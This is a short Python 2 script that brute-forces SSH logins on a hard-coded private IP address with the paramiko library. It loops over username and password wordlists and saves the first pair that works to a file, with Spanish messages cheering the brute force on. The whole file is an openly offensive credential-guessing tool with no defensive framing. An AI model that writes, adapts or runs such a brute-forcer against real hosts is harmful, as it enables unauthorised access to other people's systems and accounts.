# -*- coding: utf-8 -*-

import paramiko

obj = '192.168.1.130'
def brute(obj):
    usrs = open('/tmp/amanda/user-pass/users.txt')
    passwd = open('/tmp/amanda/user-pass/pass.txt')
    client = paramiko.SSHClient()
    paramiko.util.log_to_file("filename.log")
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    user = open('/tmp/amanda/user-pass/users.txt', 'r')
    passwd = open('/tmp/amanda/user-pass/pass.txt', 'r')
    print 'Un poco de fuerza bruta siempre viene bien...'
    print 'Espere mientras probamos ciertas combinaciones, aviso que tarda'
    list_us = []
    list_pass = []
    for i in user.readlines():
        list_us.append(i[:-1])
    for i in passwd.readlines():
        list_pass.append(i[:-1])
    usrs.close()
    passwd.close()

    for user in list_us:
        for pas in list_pass:
            try:
                print 'user: ' + user + ' pass: ' + pas
                client.connect(obj, username=user, password=pas)
                txt = open('/tmp/amanda/%s.txt' % obj, 'ab')
                txt.write('user: ' + user + ' pass: ' + pas)
                txt.close()
                client.close()
                print 'Se ha creado el archivo %s en /tmp/amanda con las claves de acceso' % obj
                exit()
            except:
                pass